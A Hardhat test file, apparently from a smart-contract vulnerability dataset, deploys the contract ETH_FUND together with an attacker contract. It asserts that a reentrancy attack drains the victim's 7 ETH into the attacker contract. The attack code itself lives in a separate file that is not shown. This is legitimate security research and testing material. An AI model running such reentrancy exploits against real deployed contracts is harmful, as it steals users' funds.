const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x941d225236464a25eb18076df7da6a91d0f95e9e.sol", function () {  
    let ETH_FUND;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy ETH_FUND contract with Log address
        ETH_FUND = await ethers.getContractFactory("contracts/dataset/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e.sol:ETH_FUND");
        victim = await ETH_FUND.deploy(log.target); // Set Log address on constructor
        await victim.waitForDeployment();
        
        // Deploy MaliciousContract with ETH_FUND address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on victim contract
        await hacker.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack({value:  ethers.parseEther("2")});
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has a drained account
        expect(victimBalance).to.equal(ethers.parseEther("0")); 

        // 5 original balance + 2 from  initial deposit + 2 from CashOut fallback function 
        expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
        
    });
    });
  